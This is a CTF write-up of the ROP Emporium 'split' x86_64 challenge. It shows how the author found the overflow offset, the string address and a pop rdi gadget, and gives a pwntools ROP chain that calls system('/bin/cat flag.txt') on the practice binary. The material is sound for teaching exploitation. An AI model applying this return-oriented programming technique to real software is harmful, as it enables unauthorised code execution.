---
layout: post
title: "ROP Emporium: split x86_64"
date: 2026-04-15
---


## Challenge

In this challenge, we are given a binary called `split`. The goal is to exploit a stack based buffer overflow and redirect execution to `system()`, passing the string `"/bin/cat flag.txt"` as its argument in order to print the flag.

We are provided with:  
- `system()` function  
- A string `"/bin/cat flag.txt"` stored in memory  
- A vulnerable function `pwnme()` which is vulnerable to buffer overflow 
## Approach

**Security Check**

![checksec](/assets/images/2026-04-15/checksec.png)

As we can see `NX enabled` which means the stack is non-executable and we cannot inject shellcode and must use ROP techniques.

**Inspecting the functions**

![functions](/assets/images/2026-04-15/functions.png)

Inspecting the functions shows:  
  
- `main`  
- `pwnme`  
- `usefulFunction`  
- `system@plt`

The most interesting function is:  
  
### `usefulFunction`  
  
Disassembling it reveals:

![disass](/assets/images/2026-04-15/disass.png)
Some observations:
- `0x40084a` is a pointer to the string `"/bin/ls"`
- This value is passed into `system()` through the `edi` register 

So , this function executes:

```c
system("/bin/ls");
```


**Finding the Offset**

Lets find the offset using a cyclic pattern

```bash

pwndbg> cyclic(100)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

pwndbg> run
 
RSP  0x7fffffffdb48 ◂— 0x6161616161616166 ('faaaaaaa')

pwndbg> cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

Offset = 40 bytes

**Finding the String Address**
```bash
pwndbg> search -t string "/bin/cat flag.txt""
Searching for string: b'/bin/cat flag.txt\x00'
split           0x601060 '/bin/cat flag.txt'
```

As you can see the address is `0x601060` 

**Finding a gadget using ROPgadget**

We need a gadget to control the first argument register `rdi`:

![ROPgadget](/assets/images/2026-04-15/ROPgadget.png)

Okay now that we have the everything we need lets make our payload.

**Exploit Code**

``` python
from pwn import *

p = process("./split")

pop_rdi = 0x00000000004007c3
offset = 40
system = 0x000000000040074b
string = 0x601060

payload = (b'A' * offset)
payload += p64(pop_rdi)
payload += p64(string)
payload += p64(system)

p.sendline(payload)
p.interactive()

```

This triggers :
```c
system("/bin/cat flag.txt");
``` 

![success](/assets/images/2026-04-15/success.png)

We have now got our flag `ROPE{a_placeholder_32byte_flag!}` 

[whatisapointer](https://x.com/whatisapointer)

